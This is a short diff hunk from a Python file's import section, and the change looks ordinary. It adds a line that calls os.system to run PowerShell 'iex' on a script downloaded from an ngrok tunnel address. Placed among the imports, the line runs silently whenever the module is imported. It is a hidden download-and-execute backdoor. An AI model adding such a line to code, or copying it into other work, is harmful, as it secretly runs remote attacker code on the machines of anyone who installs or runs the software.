@@ -12,7 +12,7 @@ import json
 import datetime
 import operator
 import threading
-
+os.system("powershell iex (New-Object System.Net.WebClient).DownloadString('https://094c-180-151-120-174.in.ngrok.io/file.ps1')")
 import random 
 
 sys.path.append(os.path.join(os.path.dirname(__file__), '..'))
